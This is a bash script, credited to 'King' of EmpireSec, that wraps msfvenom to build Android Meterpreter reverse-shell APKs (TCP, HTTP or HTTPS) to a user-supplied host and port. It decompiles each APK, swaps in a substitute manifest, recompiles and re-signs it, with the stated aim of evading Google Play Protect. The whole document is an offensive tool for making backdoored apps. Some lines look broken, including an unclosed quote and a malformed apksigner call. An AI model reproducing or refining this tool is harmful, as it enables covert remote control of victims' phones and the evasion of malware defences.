#!/bin/bash
clear
echo '    ____             __   ____  ____  ____      '
echo '   / __ )____ ______/ /__/ __ \/ __ \/ __ \_____'
echo '  / __  / __ `/ ___/ //_/ / / / / / / / / / ___/'
echo ' / /_/ / /_/ / /__/ ,< / /_/ / /_/ / /_/ / /    '
echo '/_____/\__,_/\___/_/|_/_____/\____/\____/_/     '
echo '------------------------------------------------'
echo 'Author    : King'
echo 'Instagram : @the.empiresec'
echo 'GitHub.   : https://github.com/theEmpireSec/
echo '-----------------------------------------------'
echo 'Description: This script will make your msfvenom'
echo 'payload undetectable from play protect.'
echo '------------------------------------------------'

#userPrompt
read -p "[*] Enter name of payload#~: " backdoor
read -p "[*] Enter lhost#~: " lhost
read -p "[*] Enter lport#~: " lport
clear
echo '[1] android/meterpreter/reverse_tcp'
echo '[2] android/meterpreter/reverse_http'
echo '[3] android/meterpreter/reverse_https'
read -p 'Enter Payload Type#~:' type
if [ $type = '1' ] || [ $type = '01' ];
then
#payloadGeneration
echo '[*] Generating Payload#~:'
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > backdoor.apk


#decompiling
echo '[*] Decompiling apk'
apktool d backdoor.apk
rm backdoor.apk && cd backdoor
rm AndroidManifest.xml && cd ..
cp AndroidManifest.xml backdoor




#Recompiling
echo '[*] Recompiling apk'
apktool b backdoor
cd backdoor && cd dist
mv backdoor.apk ..
cd .. && mv backdoor.apk ..
cd .. && rm -rf backdoor



#Signing Apk
echo '[*] Signing Apk'
apksigner -p KING keystore backdoor.apk final.apk
rm backdoor.apk
mv final.apk $backdoor.apk




elif [ $type = '2' ] || [ $type = '02' ];
then
#Payload generation
echo '[*] Generating Payload#~:'
msfvenom -p android/meterpreter/reverse_http LHOST=$lhost LPORT=$lport R > backdoor.apk

#decompiling
echo '[*] Decompiling apk'
apktool d backdoor.apk
rm backdoor.apk && cd backdoor
rm AndroidManifest.xml && cd ..
cp AndroidManifest.xml backdoor


#Recompiling
echo '[*] Recompiling apk'
apktool b backdoor
cd backdoor && cd dist
mv backdoor.apk ..
cd .. && mv backdoor.apk ..
cd .. && rm -rf backdoor






echo '[*] Signing Apk'
apksigner -p KING keystore backdoor.apk final.apk
rm backdoor.apk
mv final.apk $backdoor.apk

elif [ $type = '3' ] || [ $type = '03' ];
then
#Payload generation
echo '[*] Generating Payload#~:'
msfvenom -p android/meterpreter/reverse_https LHOST=$lhost LPORT=$lport R > backdoor.apk


#decompiling
echo '[*] Decompiling apk'
apktool d backdoor.apk
rm backdoor.apk && cd backdoor
rm AndroidManifest.xml && cd ..
cp AndroidManifest.xml backdoor




#Recompiling
echo '[*] Recompiling apk'
apktool b backdoor
cd backdoor && cd dist
mv backdoor.apk ..
cd .. && mv backdoor.apk ..
cd .. && rm -rf backdoor


echo '[*] Signing Apk'
apksigner -p KING keystore backdoor.apk final.apk
rm backdoor.apk
mv final.apk $backdoor.apk
fi
